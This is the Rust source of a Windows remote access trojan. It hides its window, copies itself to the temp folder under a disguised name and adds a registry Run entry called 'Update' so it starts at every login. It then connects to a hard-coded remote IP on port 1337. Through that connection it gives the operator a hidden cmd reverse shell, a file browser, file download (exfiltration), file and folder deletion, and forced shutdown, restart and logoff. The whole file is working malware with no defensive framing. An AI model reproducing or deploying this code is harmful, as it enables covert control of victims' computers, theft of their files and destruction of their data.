#![windows_subsystem = "windows"]

use std::borrow::Borrow;
use std::io::{Read, Write};

use std::net::{Shutdown, TcpStream};
use std::os::windows::process::CommandExt;
use std::path::PathBuf;
use std::process::{Child, ChildStdin};
use std::ptr::write;
use std::thread::{current, sleep};
use std::time::Duration;
use std::sync::{Arc, Mutex};

use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, KEY_WRITE};
use winreg::RegKey;

static mut IS_CONNECTED: bool = false;


fn read_buffer_tcp(stream: &mut TcpStream) -> Result<Vec<u8>, ()> {
    let mut buffer = [0 as u8; 1024 * 1024]; // 1MB Buffer
    let mut vect: Vec<u8> = Vec::new();
    match stream.read(&mut buffer) {
        Ok(size) => {
            let buf_str = String::from_utf8_lossy(&buffer[0..size]);

            if size <= 0 {
                return Err(())
            }

            for v in &buffer[0..size] {
                vect.push(*v);
            }


            if !buf_str.ends_with("\n----------ENDOFCONTENT----------\n") {
                loop {
                    if let Ok(_size) = stream.read(&mut buffer) {
                        if _size == 0 {
                            return Err(());
                        }

                        for v in &buffer[0.._size] {
                            vect.push(*v);
                        }

                        if String::from_utf8_lossy(vect.as_slice()).ends_with("\n----------ENDOFCONTENT----------\n") {
                            vect = vect[0..(vect.len() - 34)].to_vec();
                            break;
                        }
                    } else {
                        return Err(());
                    }
                }
            } else {
                vect = vect[0..vect.len()-34].to_vec();
            }
            Ok(vect)
        },
        Err(_) => {
            Err(())
        }
    }
}

fn read_buffer<I>(stream: &mut I) -> Result<Vec<u8>, ()>
    where I: Read {
    let mut buffer = [0 as u8; 1024]; // 1MB Buffer
    match stream.read(&mut buffer) {
        Ok(size) => {
            if size <= 0 {
                return Err(());
            }

            let mut vect: Vec<u8> = Vec::new();
            for v in &buffer[0..size] {
                vect.push(*v);
            }

            Ok(vect)
        },
        Err(_) => {
            Err(())
        }
    }
}

fn write_content(stream: &mut TcpStream, bytes: &[u8]) {
    stream.write(bytes);
}

fn write_bytes(stream: &mut TcpStream, bytes: &[u8]) {
    let mut vec = bytes.to_vec();
    "\n----------ENDOFCONTENT----------\n".as_bytes().iter().for_each(|b| vec.push(*b));
    stream.write(vec.as_slice());
}

unsafe fn handle_server(mut read_stream: TcpStream, mut write_stream: TcpStream) {
    // CMD REMOTE
    let mut remote_shell: Child = std::process::Command::new("cmd")
        .spawn()
        .unwrap();
    remote_shell.kill();
    // File Manager
    let mut current_path = std::path::PathBuf::new();
    loop {
        let mut received = read_buffer_tcp(&mut read_stream.try_clone().unwrap());
        if let Ok(bytes) = received {
            let mut _text_split: Vec<String> = String::from_utf8(bytes.clone()).unwrap_or("".into()).trim().to_string()
                .split("\n").map(|s| s.to_string()).collect();

            for text in _text_split {
                if text == "r1" {
                    write_content(&mut write_stream,
                                  format!("{}{}", "receive::",
                                          std::env::var("username").unwrap_or("__UNKNOWN__".to_string()).as_str()).as_bytes());
                }

                // Shell
                if text == "start_shell" {
                    const DETACH: u32 = 0x00000008;
                    const HIDE: u32 = 0x08000000;

                    remote_shell = std::process::Command::new("cmd")
                        .creation_flags(HIDE)
                        .stdin(std::process::Stdio::piped())
                        .stdout(std::process::Stdio::piped())
                        .stderr(std::process::Stdio::piped())
                        .spawn()
                        .unwrap();

                    let mut cmd_output = remote_shell.stdout;
                    let mut write_clone = write_stream.try_clone().unwrap();
                    std::thread::spawn(move || {
                        loop {
                            let read = read_buffer(cmd_output.as_mut().unwrap());
                            match read {
                                Ok(vec) => {
                                    write_bytes(&mut write_clone, String::from("shellout:".to_string() + String::from_utf8_lossy(vec.as_slice()).borrow()).as_bytes());
                                },
                                Err(_) => {
                                    break;
                                }
                            }
                        }
                    });
                }
                if text == "exit_shell" {
                    if let Some(_) = remote_shell.stdin.as_mut() {
                        remote_shell.stdin.as_mut().unwrap().write(b"exit\n");
                        remote_shell.stdin.as_mut().unwrap().flush();
                    }
                }
                if text.starts_with("shell::") {
                    if let Some(_) = remote_shell.stdin.as_mut() {
                        let arr = text.split("shell::").collect::<Vec<&str>>();
                        remote_shell.stdin.as_mut().unwrap().write(String::from(arr[1].to_string() + "\n").as_bytes());
                        remote_shell.stdin.as_mut().unwrap().flush();
                    }
                }

                // File Manager
                if text == "a_d" {
                    current_path = std::path::PathBuf::new();
                    get_available_disks().iter().for_each(|d|
                        write_bytes(&mut write_stream, format!("disks||{}:\\", d).as_bytes()));
                }
                if text == "p_f" {
                    if let Some(read) = (&current_path).parent() {
                        for f in read.read_dir().unwrap() {
                            let entry = f.unwrap();
                            let file_type = (&entry).file_type().unwrap();
                            if file_type.is_dir() {
                                write_bytes(&mut write_stream, format!("fm||dir||{}\n", (&entry).file_name().to_string_lossy()).as_bytes());
                            } else if file_type.is_file() {
                                write_bytes(&mut write_stream, format!("fm||file||{}\n", (&entry).file_name().to_string_lossy()).as_bytes());
                            }
                        }
                        current_path = read.to_path_buf();
                        write_bytes(&mut write_stream, format!("current_folder||{}\n", current_path.as_path().to_string_lossy().to_string()).as_bytes());
                    } else {
                        current_path = std::path::PathBuf::new();
                        get_available_disks().iter().for_each(|d|
                            write_bytes(&mut write_stream, format!("disks||{}:\\", d).as_bytes()));
                        write_bytes(&mut write_stream, "current_folder|| ".as_bytes());
                    }
                }
                if text.starts_with("v_f||") {
                    let arr = text.split("v_f||").collect::<Vec<&str>>();
                    current_path.push(arr[1]);
                    write_bytes(&mut write_stream, format!("current_folder||{}", current_path.as_path().to_string_lossy().to_string()).as_bytes());

                    for f in current_path.read_dir().unwrap() {
                        if let Ok(entry) = f {
                            let file_type = (&entry).file_type().unwrap();
                            if file_type.is_dir() {
                                write_bytes(&mut write_stream, format!("fm||dir||{}\n", (&entry).file_name().to_string_lossy()).as_bytes());
                            } else if file_type.is_file() {
                                write_bytes(&mut write_stream, format!("fm||file||{}\n", (&entry).file_name().to_string_lossy()).as_bytes());
                            }
                        }
                    }
                }
                if text.starts_with("rd||") {
                    let arr = text.split("rd||").collect::<Vec<&str>>();
                    std::fs::remove_dir_all(format!("{}/{}", current_path.to_string_lossy(), arr[1]));

                    for f in current_path.read_dir().unwrap() {
                        let entry = f.unwrap();
                        let file_type = (&entry).file_type().unwrap();
                        if file_type.is_dir() {
                            write_bytes(&mut write_stream, format!("fm||dir||{}\n", (&entry).file_name().to_string_lossy()).as_bytes());
                        } else if file_type.is_file() {
                            write_bytes(&mut write_stream, format!("fm||file||{}\n", (&entry).file_name().to_string_lossy()).as_bytes());
                        }
                    }
                }
                if text.starts_with("rf||") {
                    let arr = text.split("rf||").collect::<Vec<&str>>();
                    std::fs::remove_file(format!("{}/{}", current_path.to_string_lossy(), arr[1]));

                    for f in current_path.read_dir().unwrap() {
                        let entry = f.unwrap();
                        let file_type = (&entry).file_type().unwrap();
                        if file_type.is_dir() {
                            write_bytes(&mut write_stream, format!("fm||dir||{}\n", (&entry).file_name().to_string_lossy()).as_bytes());
                        } else if file_type.is_file() {
                            write_bytes(&mut write_stream, format!("fm||file||{}\n", (&entry).file_name().to_string_lossy()).as_bytes());
                        }
                    }
                }
                if text.starts_with("dw||") {
                    let arr: Vec<&str> = text.split("dw||").collect();
                    if let Ok(bytes) = std::fs::read(current_path.to_string_lossy().to_string() + "\\" + arr[1].clone()) {
                        let mut vec: Vec<u8> = Vec::new();
                        "downloadfile||".as_bytes().iter().for_each(|b| {
                            vec.push(*b);
                        });
                        for x in arr[1].clone().as_bytes() {
                            vec.push(*x);
                        }
                        "||".as_bytes().iter().for_each(|b| vec.push(*b));
                        for x in bytes {
                            vec.push(x);
                        }

                        let mut ws_clone = write_stream.try_clone().unwrap();
                        let vec_clone = vec.clone();
                        std::thread::spawn(move || {
                            write_bytes(&mut ws_clone, vec_clone.as_slice());
                        });
                    }
                }

                // Actions
                if text == "s_d" {
                    const HIDE: u32 = 0x08000000;
                    std::process::Command::new("shutdown")
                        .creation_flags(HIDE)
                        .args(&["/s", "/t", "0"])
                        .spawn();
                }
                if text == "l_o" {
                    const HIDE: u32 = 0x08000000;
                    std::process::Command::new("shutdown")
                        .creation_flags(HIDE)
                        .args(&["/f"])
                        .spawn();
                }
                if text == "r_s" {
                    const HIDE: u32 = 0x08000000;
                    std::process::Command::new("shutdown")
                        .creation_flags(HIDE)
                        .args(&["/r", "/t", "0"])
                        .spawn();
                }

                // Clients
                // if text == "d_s" {
                //     const DETACH: u32 = 0x00000008;
                //     const HIDE: u32 = 0x08000000;
                //
                //     let mut path = std::env::current_exe().unwrap().to_string_lossy().to_string();
                //     path = path.replace("\\\\?\\", "");
                //
                //     std::process::Command::new("cmd")
                //         .arg(format!("/c reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /f"))
                //         .creation_flags(HIDE)
                //         .output();
                //
                //     std::process::Command::new("cmd")
                //         .arg("/c timeout 3 & del ")
                //         .raw_arg(format!("\"{}\"", path))
                //         .arg("/s")
                //         .arg("/q")
                //         .creation_flags(HIDE)
                //         .spawn();
                //
                //     std::process::exit(0)
                // }
                if text == "s_c" {
                    std::process::exit(0)
                }
                if text.starts_with("uf||") {
                    let data = &bytes[4..bytes.len()];
                }
            }
        } else {
            // println!("disconnected!");
            IS_CONNECTED = false;

            if let Some(_) = remote_shell.stdin.as_mut() {
                remote_shell.stdin.as_mut().unwrap().write(b"exit\n");
                remote_shell.stdin.as_mut().unwrap().flush();
            }
            break;
        }

    }
}

// 일단 지금은 실행한 경로에 자동시작 추가.
unsafe fn reg_startup() {
    const HIDE: u32 = 0x08000000;

    let mut cur = std::env::current_exe().unwrap().to_str().unwrap().to_string();
    cur = cur.replace("\\\\?\\", "");
    std::process::Command::new("cmd")
        .arg("/c")
        .arg("reg")
        .arg("add")
        .arg("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
        .arg("/v")
        .arg("Update")
        .arg("/t")
        .arg("REG_SZ")
        .arg("/d")
        .raw_arg(format!("\"{}\"", cur))
        .arg("/f")
        .creation_flags(HIDE)
        .output();
    // let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    // let run = hkcu.open_subkey_with_flags(
    //     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    //     KEY_WRITE);
    //
    // let mut cur = std::env::current_exe().unwrap().to_str().unwrap().to_string();
    // cur = cur.replace("\\\\?\\", "");
    //
    // if let Ok(key) = run {
    //     key.set_value("Update", &format!("\"{}\"", cur)).unwrap();
    // }
}

fn copy_file(to: PathBuf) {
    let exe = std::env::current_exe().unwrap();
    if exe == to { // Already setup file
        return;
    }

    if to.exists() { // if exists kill process
        std::process::Command::new("taskkill")
            .creation_flags(0x00000008)
            .arg("/f")
            .arg("/im")
            .arg(to.file_name().unwrap().to_string_lossy().to_string())
            .output();
    }

    std::fs::remove_file(to.clone());
    std::fs::write(to.clone(), std::fs::read(exe).unwrap());
    std::process::Command::new(to.to_string_lossy().to_string())
        .creation_flags(0x00000008) // Detach Process
        .spawn();
    std::process::exit(0)
}

fn main() {
    unsafe {
        // Add temp file
        let mut temp = std::env::temp_dir();
        temp.push("tmp_12FcXs.exe");
        copy_file(temp);
        reg_startup();

        loop {
            if IS_CONNECTED { // CONNECTED
                sleep(std::time::Duration::from_secs(5));
                continue
            }
            std::thread::spawn(|| {
                let mut stream = TcpStream::connect("58.126.1.57:1337");
                match stream {
                    Ok(str) => {
                        IS_CONNECTED = true;
                        // println!("Connected!");
                        handle_server(str.try_clone().unwrap(),
                                      str.try_clone().unwrap());
                    },
                    Err(_) => {}
                };
            });
            // println!("Try connect..");
            sleep(std::time::Duration::from_secs(5));
        }
    }
}

fn get_available_disks() -> Vec<String> {
    let arr = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P"
        , "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
    let mut available: Vec<String> = Vec::new();
    for dr in arr {
        let str = format!("{}:\\", dr);
        if let Ok(_) = std::path::Path::new(str.as_str()).read_dir() {
            &available.push(dr.to_string());
        }
    }

    available
}